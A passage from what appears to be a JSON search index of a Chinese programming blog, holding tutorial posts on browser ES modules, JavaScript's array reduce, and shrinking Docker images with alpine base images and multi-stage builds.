module，如何使用它呢，也举个例子：\n如何使用一个 ES 的 Module 1: 建立一个 project 目录 同样是放 html 和 module 文件的。\n2: 建立 code 文件 在 project 文件夹下建立如下文件:\nindex.html module-1.js module-2.js 3: 增加 modules 文件的引用到 HTML 文件 编辑 index.html 文件，增加对 module 的引用:\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;title\u0026gt;ES Module - zhang ranrui\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;ES Module Tutorial\u0026lt;/h1\u0026gt; \u0026lt;h2\u0026gt;Check the console\u0026lt;/h2\u0026gt; \u0026lt;script type=\u0026#34;module\u0026#34; src=\u0026#34;module-1.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script type=\u0026#34;module\u0026#34; src=\u0026#34;module-2.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 4: 浏览你的 index.html 注意，这里只能在 localhost 的服务器上浏览，直接浏览本地文件会报 cors 的错。\n怎么 Export 导出一个 Module 中的代码 有两种使用方法\n在代码前使用 export 关键字 使用 export 声明语句 一、在代码前使用 export 关键字 注意：是在正式代码之前\n// module-1.js // Export the \u0026#34;bestClub\u0026#34; variable: export const bestClub = \u0026#34;Your Club\u0026#34;; 另外一个例子：\n// Export the \u0026#34;multiply\u0026#34; function: export function multiply(x, y) { return x * y; } 二、使用 export 声明语句 另一种方法是使用 export 声明语句，这种方式用 {} 包裹 要导出的变量，中间的变量名用逗号来隔开。\n// Create a variable named \u0026#34;bestClub\u0026#34;: const bestClub = \u0026#34;Your Club\u0026#34;; // Create a function named \u0026#34;multiply\u0026#34;: function multiply(x, y) { return x * y; } // Create an array named \u0026#34;fruits\u0026#34;: const fruits = [\u0026#34;Mango\u0026#34;, \u0026#34;Apple\u0026#34;, \u0026#34;Orange\u0026#34;, \u0026#34;Lemon\u0026#34;]; // Export the three statements above: export { bestClub, multiply, fruits }; 导出有了，怎样导入别的模块 Exported 的代码呢？ 接上的例子，只导入一个变量：\n// module-2.js import { bestClub } from \u0026#34;./module-1.js\u0026#34;; 导入所有变量\n// Import three items from the module-1.js file: import { bestClub, multiply, fruits } from \u0026#34;./module-1.js\u0026#34;; 注意./是表示当前路径，如果路径不对，有可能需要全路径导入\n// Import three items from the module-1.js file: import { bestClub, multiply, fruits } from \u0026#34;/codesweetly/blog/notes/modular-javascript/es-modules/module-1.js\u0026#34;; 注意在后端 Node.js 和 module bundlers 中，是允许你不写文件名后缀的，比如下面\n// Import three items from the module-1.js file: import { bestClub, multiply, fruits } from \u0026#34;module-1\u0026#34;; 但是，在 ES modules 中，不允许省略文件后缀。\n如何使用从别的模块 Imported 导入的代码 // module-2.js import { bestClub } from \u0026#34;./module-1.js\u0026#34;; const myBestClub = bestClub + \u0026#34; \u0026#34; + \u0026#34;is my best club.\u0026#34;; console.log(myBestClub); 注意:\nimport 关键字只能出现在 modules 文件中，不能出现在通常的 JavaScript 程序文件中。 一个被 imported 导入的模块只能作用于本文件中，而不是全局可用。你只能在这个文件中使用。 JavaScript 会自动提升 import 语句的作用域，所以你可以在任何地方使用 import ，甚至在使用其中代码之后。 Imported 导入的模块缺省处于 strict 严格模式下。 如何将 Exports 和 Imports 导入导出的模块重命名 用 as 即可：\n// module-1.js // Create a variable named \u0026#34;bestClub\u0026#34;: const bestClub = \u0026#34;Your Club\u0026#34;; // Export the bestClub variable as \u0026#34;favoriteTeam\u0026#34;: export { bestClub as favoriteTeam }; 接下来使用就不能是 bestclub , 而是 favoriteTeam 了：\n// module-2.js import { favoriteTeam } from \u0026#34;./module-1.js\u0026#34;; const myBestClub = favoriteTeam + \u0026#34; \u0026#34; + \u0026#34;is my best club.\u0026#34;; console.log(myBestClub); 同样可以在 import 的时候使用 as\n// module-1.js // Create a variable named \u0026#34;bestClub\u0026#34;: const bestClub = \u0026#34;Your Club\u0026#34;; // Export the bestClub variable: export { bestClub }; // module-2.js import { bestClub as favoriteTeam } from \u0026#34;./module-1.js\u0026#34;; const myBestClub = favoriteTeam + \u0026#34; \u0026#34; + \u0026#34;is my best club.\u0026#34;; console.log(myBestClub); 如何在 ES Module 中重命名多个 Exports 导出 很简单，用as加上逗号分割符号\n// module-1.js const bestClub = \u0026#34;Your Club\u0026#34;; const fruits = [\u0026#34;Grape\u0026#34;, \u0026#34;Apple\u0026#34;, \u0026#34;Pineapple\u0026#34;, \u0026#34;Lemon\u0026#34;]; function multiply(x, y) { return x * y; } // Export the three statements above: export { bestClub as favoriteTeam, fruits as crops, multiply as product }; // module-2.js import { favoriteTeam, crops, product } from \u0026#34;./module-1.js\u0026#34;; const bestClub = `I bought ${product(2, 11)} ${crops[2]}s at ${favoriteTeam}.`; console.log(bestClub); 如何在 ES Module 中重命名多个 Import 导入 跟上面一样：\n// module-1.js const bestClub = \u0026#34;Your Club\u0026#34;; const fruits = [\u0026#34;Grape\u0026#34;, \u0026#34;Apple\u0026#34;, \u0026#34;Pineapple\u0026#34;, \u0026#34;Lemon\u0026#34;]; function multiply(x, y) { return x * y; } // Export the three statements above: export { bestClub, fruits, multiply }; // module-2.js import { bestClub as favoriteTeam, fruits as crops, multiply as product } from \u0026#34;./module-1.js\u0026#34;; const bestClub = `I bought ${product(2, 11)} ${crops[2]}s at ${favoriteTeam}.`; console.log(bestClub); 如何在 ES Module 一句话 import 导入所有导出变量 用*号：\n// Import all exportable features from the \u0026#34;countries.js\u0026#34; module: import * as allCountries from \u0026#34;./countries.js\u0026#34;; 例子如下：\n// module-1.js const bestClub = \u0026#34;Your Club\u0026#34;; const fruits = [\u0026#34;Grape\u0026#34;, \u0026#34;Apple\u0026#34;, \u0026#34;Pineapple\u0026#34;, \u0026#34;Lemon\u0026#34;]; function multiply(x, y) { return x * y; } // Export the three statements above: export { bestClub, fruits, multiply }; // module-2.js import * as firstModule from \u0026#34;./module-1.js\u0026#34;; const bestClub = `I bought ${firstModule.multiply(2, 11)} ${firstModule.fruits[2]}s at ${firstModule.bestClub}.`; console.log(bestClub); 如何在 ES Module 中 Export 指定 default 缺省导出 如果导出的时候指定 default ，就是缺省导出。Default export\n// module-1.js const bestClub = \u0026#34;Your Club\u0026#34;; // Export the bestClub variable as a default export: export default bestClub; 注意：default 两边没有花括号，因为 default 只能有一个，而且缺省导出不能是 var , let 或者 const\n如何 import 导入缺省导出 依然两种方法：\n使用 default as 的语法 直接命名缺省导出 一、使用 default as 语法 import { default as newName } from \u0026#34;./module-relative-path.js\u0026#34;; 例子：\n// module-1.js // Export the string value as a default export: export default \u0026#34;Your Club\u0026#34;; // module-2.js import { default as favoriteTeam } from \u0026#34;./module-1.js\u0026#34;; const bestClub = favoriteTeam + \u0026#34; \u0026#34; + \u0026#34;is my best club.\u0026#34;; console.log(bestClub); 二、直接命名缺省导出 这种方式，可以看作是第一种去掉花括号，去掉 default as 后的简略写法：\nimport newName from \u0026#34;./module-relative-path.js\u0026#34;; 例子：\n// module-1.js // Export the string value as a default export: export default \u0026#34;Your Club\u0026#34;; // module-2.js import favoriteTeam from \u0026#34;./module-1.js\u0026#34;; const bestClub = favoriteTeam + \u0026#34; \u0026#34; + \u0026#34;is my best club.\u0026#34;; console.log(bestClub); over，这么多，大家应该会了吧。回头会另开一篇说说如何把模块都压到一起，那就是 webpack 的功能了。\n","permalink":"https://rendoumi.com/posts/20220521-javascripts_module/","summary":"\u003ch4 id=\"javascript-module-是什么\"\u003eJavaScript Module 是什么\u003c/h4\u003e\n\u003cp\u003e一个 JavaScript \u003cstrong\u003emodule\u003c/strong\u003e 模块准确的说就是一个文件，它允许你把代码 export 导出来复用，这样别的 JavaScript 文件可以 import 这个文件把它作为库文件来使用了。\u003c/p\u003e\n\u003cp\u003e模块主要是用在工程文件中，用来把代码共享给其他文件用，javascipt 的模块可以说是满天飞。\u003c/p\u003e\n\u003cp\u003e这里呢讨论的是前端的部分，即是运行在浏览器中的 javascripts module 部分，而不是运行在后端的 Node.js 的部分，后端现在已经向前端靠拢了。\u003c/p\u003e\n\u003cp\u003eES6标准发布后，module成为标准，标准使用是以export指令导出接口，以import引入模块，但是在我们一贯的node模块中，我们依然采用的是CommonJS规范，使用require引入模块，使用module.exports导出接口。这点也理解清楚。\u003c/p\u003e\n\u003cp\u003e我们从零来一步步开始吧\u003c/p\u003e\n\u003ch4 id=\"如何把一个-javascript-文件转换为-es-的-module\"\u003e如何把一个 JavaScript 文件转换为 ES 的 module\u003c/h4\u003e\n\u003ch5 id=\"1-创建一个-project-目录\"\u003e1: 创建一个 project 目录\u003c/h5\u003e\n\u003cp\u003e这个目录用来放 HTML 和 JavaScript 文件\u003c/p\u003e\n\u003ch5 id=\"2-建立你的-code-代码文件\"\u003e2: 建立你的 code 代码文件\u003c/h5\u003e\n\u003cp\u003e在 project 文件夹中建立2个文件:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003ccode\u003eindex.html\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eindex.js\u003c/code\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch5 id=\"3-添加-javascript-文件的引用到-html-文件中\"\u003e3: 添加 JavaScript 文件的引用到 HTML 文件中\u003c/h5\u003e\n\u003cp\u003e打开\u003ccode\u003eindex.html\u003c/code\u003e 编辑它：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-html\" data-lang=\"html\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u0026lt;!DOCTYPE html\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nt\"\u003ehtml\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"p\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nt\"\u003ehead\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nt\"\u003emeta\u003c/span\u003e \u003cspan class=\"na\"\u003echarset\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;UTF-8\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nt\"\u003emeta\u003c/span\u003e \u003cspan class=\"na\"\u003ename\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;viewport\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003econtent\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nt\"\u003etitle\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u003c/span\u003eES Module - zhang ranrui\u003cspan class=\"p\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"nt\"\u003etitle\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"p\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"nt\"\u003ehead\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"p\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nt\"\u003ebody\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nt\"\u003eh1\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u003c/span\u003eES Module Tutorial\u003cspan class=\"p\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"nt\"\u003eh1\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"c\"\u003e\u0026lt;!-- Add the \u0026#34;index.js\u0026#34; JavaScript file to this HTML document --\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nt\"\u003escript\u003c/span\u003e \u003cspan class=\"na\"\u003etype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;module\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003esrc\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;index.js\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u0026lt;/\u003c/span\u003e\u003cspan class=\"nt\"\u003escript\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"p\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"nt\"\u003ebody\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"nt\"\u003ehtml\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e上面的代码中，我们引用了 index.js , 并定义它 type=\u0026ldquo;module\u0026rdquo;，这显式指明了 index.js 是一个 ES 的module。\u003c/p\u003e","title":"javascripts中的module"},{"content":"研究一下 javascripts 的 reduce ，reduce 是既能改变 array 的 size，又能改变数值的函数，filter 是只能改变size，不能改变数值；而 map 是不能改变 size，可以改变数值。很拗口吧，三个兄弟。\n简单介绍一下 reduce。\n假设我们有一个数组:\n[1, 2, 3, 4] 我们要对整个数组求和.\nreduce 实际是按照下列的算式来进行求和的:\n((((1) + 2) + 3) + 4)\n那实际 reduce 函数执行中，你可以按你需求来自定义你自己的 + 操作符。数组的值也可以是其他的任意东西。听起来有点意思吧？\n1、 Reduce 是干嘛的 在一个函数式编程语言中，reduce 其实有很多别的名称，比如 fold（对折）, accumulate（累加器）, aggregate（聚合器）, compress（压缩） 甚至叫 inject（注入）。\n2、 Reduce 的参数 常用用法如下：\nlet myArray = [/* 首先定义一个数组 */]; let callbackfn = /* 再定义一个函数 */ ; let initialvalue = /* 任意一个初始化的值 */ ; myArray.reduce(callbackfn) myArray.reduce(callbackfn, initialValue) reduce 的参数如下:\ncallbackfn: 必须是一个函数，会在整个数组中反复调用，reduce 调用 callbackfn 的时候有4个参数，我们定义它们是 previousValue, currentElement, index 和 array ，看起来像下面一样:\ncallbackfn(previousValue, currentElement, index, array) 解释一下:\npreviousValue: 这个参数就是一个累加器。 currentElement: 数组中处理的当前元素。 index: 当前元素的索引值。 array: myArray调用的数组. Return value（返回值）: 最后一次调用 callbackfn 的时候，返回值就是整个 reduce 过程的返回值。如果不是最后一次调用，它返回的值会被下次的 callbackFn 的 previousvalue 参数接收。\n我们必须注意，函数就是函数，函数过程中处理的变量要么是外围的 scope 带进来的，要么是函数体内自定义的，所以后面两个 index 和 array 也是必须存在的，只不过是 reduce 函数替你自动处理了。\n3、 用画图来理解 Reduce 看上面的图，reduce 和 reductRight 函数的区别就是方向，一个是从左到右，一个是从右到左。\n关注点如下:\nacc 相当于 previousValue ，累加器. curVal 相当于currentElement，当前处理元素. 数组中的每个元素向下输出到圈 r 就是curVal输出到***r***的具体表现. 包含数组元素的长方形输出到下一个 r 就是 acc 输出到***r***的具体表现. 初始化值在数组外单独表示，它是作为一个单独的 acc 输出到 r 中的. 3、 用流程图来理解 Reduce 下面用20行的伪代码来详细解释整个 reduce 的过程，首先进入 reduce 函数：\nIf initialValue is present, 如果初始化变量不为空 If myArray has no elements, 接着判断如果数组为空 Return initialValue. 那么直接初始化变量作为 reduce 的结果返回 else 初始化变量为空但数组不为空 Let accumulator be initialValue. 把初始变量赋给累加器 If the method is reduce, 如果方法是 reduce Let startIndex be the index of the leftmost element of myArray. 把数组最左边的元素的index值赋予 startIndex else 如果初始化变量为空 If myArray has no elements, 如果数组没有元素 Throw TypeError. 初始化变量为空，数组也为空，直接抛类型错误 Else if myArray has just only one element, 如果数组只有一个元素 Return that element. 那么直接将数组中唯一一个元素作为 reduce 结果返回 Else If the method is reduce,如果方法是 reduce Let accumulator be the leftmost element of myArray. 把数组最左边的第一个元素赋给累加器 If the method is reduce, 如果方法是reduce In left to right order, for each element of myArray such that its index i ≥ startingIndex, 按照从左到右的顺序，遍历数组中的每一个元素，来个大循环 Set accumulator to callbackfn(accumulator, myArray[i], i, myArray). 数组中的每个元素，都逐个设置到callbackfn函数中并运行 Return accumulator. 累加器的值作为 reduce 结果返回 仔细理解，搞完了吧。\n给个实际例子，一群学生，有男有女，先选出女学生，然后计算出她们每个人的平均成绩，最后把她们打印出来：\nconst students = [ { name: \u0026#34;Anna\u0026#34;, sex: \u0026#34;f\u0026#34;, grades: [4.5, 3.5, 4] }, { name: \u0026#34;Dennis\u0026#34;, sex: \u0026#34;m\u0026#34;, country: \u0026#34;Germany\u0026#34;, grades: [5, 1.5, 4] }, { name: \u0026#34;Martha\u0026#34;, sex: \u0026#34;f\u0026#34;, grades: [5, 4, 2.5, 3] }, { name: \u0026#34;Brock\u0026#34;, sex: \u0026#34;m\u0026#34;, grades: [4, 3, 2] } ]; //TODO: Compute and Return female students results using functional programming. function studentResult(students){ return students.filter(x =\u0026gt; x.sex==\u0026#34;f\u0026#34;).reduce((init,cur)=\u0026gt;{ cur[\u0026#39;grades\u0026#39;]=cur.grades.reduce((acc,cur) =\u0026gt; acc+cur,0)/cur.grades.length; return init.concat(cur); },[]); } console.log(studentResult(students)); //[ { name: \u0026#39;Anna\u0026#39;, sex: \u0026#39;f\u0026#39;, grades: 4 }, { name: \u0026#39;Martha\u0026#39;, sex: \u0026#39;f\u0026#39;, grades: 3.625 } ] 注意一点，reduce 可以动 size，也可以动值，上面实际改变了 students 数组元素的值了，不太好。应该赋一个新值 concat 或者 push 进新数组。\n下面的方法就没有动原数组的数据：\nfunction studentResult(students){ return students.filter(x =\u0026gt; x.sex==\u0026#34;f\u0026#34;).reduce((init,cur)=\u0026gt;{ let newarr = {}; newarr[\u0026#39;name\u0026#39;]=cur.name; newarr[\u0026#39;sex\u0026#39;]=cur.sex; newarr[\u0026#39;grades\u0026#39;]=cur.grades.reduce((acc,cur) =\u0026gt; acc+cur,0)/cur.grades.length; init.push(newarr); return init; },[]); } ","permalink":"https://rendoumi.com/posts/20220520-javascripts_reduce/","summary":"\u003cp\u003e研究一下 javascripts 的 reduce ，reduce 是既能改变 array 的 size，又能改变数值的函数，filter 是只能改变size，不能改变数值；而 map 是不能改变 size，可以改变数值。很拗口吧，三个兄弟。\u003c/p\u003e\n\u003cp\u003e简单介绍一下 reduce。\u003c/p\u003e\n\u003cp\u003e假设我们有一个数组:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-js\" data-lang=\"js\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e4\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e我们要对整个数组求和.\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ereduce\u003c/code\u003e 实际是按照下列的算式来进行求和的:\u003c/p\u003e\n\u003cp\u003e((((1) + 2) + 3) + 4)\u003c/p\u003e\n\u003cp\u003e那实际 \u003ccode\u003ereduce\u003c/code\u003e 函数执行中，你可以按你需求来自定义你自己的 + 操作符。数组的值也可以是其他的任意东西。听起来有点意思吧？\u003c/p\u003e\n\u003ch4 id=\"1-reduce-是干嘛的\"\u003e\u003cstrong\u003e1、\u003c/strong\u003e Reduce 是干嘛的\u003c/h4\u003e\n\u003cp\u003e在一个函数式编程语言中，reduce 其实有很多别的名称，比如 \u003cstrong\u003efold（对折）\u003c/strong\u003e, \u003cstrong\u003eaccumulate（累加器）\u003c/strong\u003e, \u003cstrong\u003eaggregate（聚合器）\u003c/strong\u003e, \u003cstrong\u003ecompress（压缩）\u003c/strong\u003e 甚至叫 \u003cstrong\u003einject（注入）\u003c/strong\u003e。\u003c/p\u003e\n\u003ch4 id=\"2-reduce-的参数\"\u003e\u003cstrong\u003e2、\u003c/strong\u003e Reduce 的参数\u003c/h4\u003e\n\u003cp\u003e常用用法如下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003elet\u003c/span\u003e \u003cspan class=\"nv\"\u003emyArray\u003c/span\u003e      \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e/* 首先定义一个数组 */\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003elet\u003c/span\u003e \u003cspan class=\"nv\"\u003ecallbackfn\u003c/span\u003e   \u003cspan class=\"o\"\u003e=\u003c/span\u003e /* 再定义一个函数 */ \u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003elet\u003c/span\u003e \u003cspan class=\"nv\"\u003einitialvalue\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e /* 任意一个初始化的值 */ \u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emyArray.reduce\u003cspan class=\"o\"\u003e(\u003c/span\u003ecallbackfn\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emyArray.reduce\u003cspan class=\"o\"\u003e(\u003c/span\u003ecallbackfn, initialValue\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003ccode\u003ereduce\u003c/code\u003e 的参数如下:\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ccode\u003ecallbackfn\u003c/code\u003e\u003c/strong\u003e: 必须是一个函数，会在整个数组中反复调用，reduce 调用 callbackfn 的时候有4个参数，我们定义它们是 \u003ccode\u003epreviousValue\u003c/code\u003e, \u003ccode\u003ecurrentElement\u003c/code\u003e, \u003ccode\u003eindex\u003c/code\u003e 和 \u003ccode\u003earray\u003c/code\u003e ，看起来像下面一样:\u003c/p\u003e","title":"Javascripts之数组的reduce"},{"content":"面试的时候被问到：如何才能让 docker 打出的镜像包尽量小？\n其实在生产已经尽量使用最小化的镜像包了，只是突然被问到还是有点懵圈；因为印象中自己基本是使用 alphine 做底包，Dockerfile 通常就是 copy 一个可执行的程序进去就完事了，如果不行，再开 shell 进去慢慢添加缺少的库文件。\n这里就总结一下，两点：\n一、使用尽量小的底包 以 alphine 为主，使用 alphine 底包的时候，需要注意以下：\n1、替换 apk 的源\n2、更新、更新证书\n3、注意 Timezone 的设置\n4、注意 glibc 库的兼容问题\n二、使用分阶段build 通常类似c、go、rust之类的源代码，都需要经过编译，最后产生可执行文件，那么完整的编译环境其实对最后的镜像来说都是不需要的。\n所以利用分阶段build，甩脱编译环境以及中间产物，就可以缩小最后 build 出镜像的大小，使用也很简单。\nDockerfile 文件内容如下：\nFROM golang:alpine AS build-env WORKDIR /app ADD . /app RUN cd /app \u0026amp;\u0026amp; go build -o goapp FROM alpine RUN apk update \u0026amp;\u0026amp; \\ apk add ca-certificates \u0026amp;\u0026amp; \\ update-ca-certificates \u0026amp;\u0026amp; \\ rm -rf /var/cache/apk/* WORKDIR /app COPY --from=build-env /app/goapp /app EXPOSE 8080 ENTRYPOINT ./goapp ","permalink":"https://rendoumi.com/posts/20220401-docker_mini_image/","summary":"\u003cp\u003e面试的时候被问到：如何才能让 docker 打出的镜像包尽量小？\u003c/p\u003e\n\u003cp\u003e其实在生产已经尽量使用最小化的镜像包了，只是突然被问到还是有点懵圈；因为印象中自己基本是使用 alphine 做底包，Dockerfile 通常就是 copy 一个可执行的程序进去就完事了，如果不行，再开 shell 进去慢慢添加缺少的库文件。\u003c/p\u003e\n\u003cp\u003e这里就总结一下，两点：\u003c/p\u003e\n\u003ch3 id=\"一使用尽量小的底包\"\u003e一、使用尽量小的底包\u003c/h3\u003e\n\u003cp\u003e以 alphine 为主，使用 alphine 底包的时候，需要注意以下：\u003c/p\u003e\n\u003cp\u003e1、替换 apk 的源\u003c/p\u003e\n\u003cp\u003e2、更新、更新证书\u003c/p\u003e\n\u003cp\u003e3、注意 Timezone 的设置\u003c/p\u003e\n\u003cp\u003e4、注意 glibc 库的兼容问题\u003c/p\u003e\n\u003ch3 id=\"二使用分阶段build\"\u003e二、使用分阶段build\u003c/h3\u003e\n\u003cp\u003e通常类似c、go、rust之类的源代码，都需要经过编译，最后产生可执行文件，那么完整的编译环境其实对最后的镜像来说都是不需要的。\u003c/p\u003e\n\u003cp\u003e所以利用分阶段build，甩脱编译环境以及中间产物，就可以缩小最后 build 出镜像的大小，使用也很简单。\u003c/p\u003e\n\u003cp\u003eDockerfile 文件内容如下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eFROM golang:alpine AS build-env\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eWORKDIR /app\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eADD . /app\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eRUN \u003cspan class=\"nb\"\u003ecd\u003c/span\u003e /app \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e go build -o goapp\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eFROM alpine\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eRUN apk update 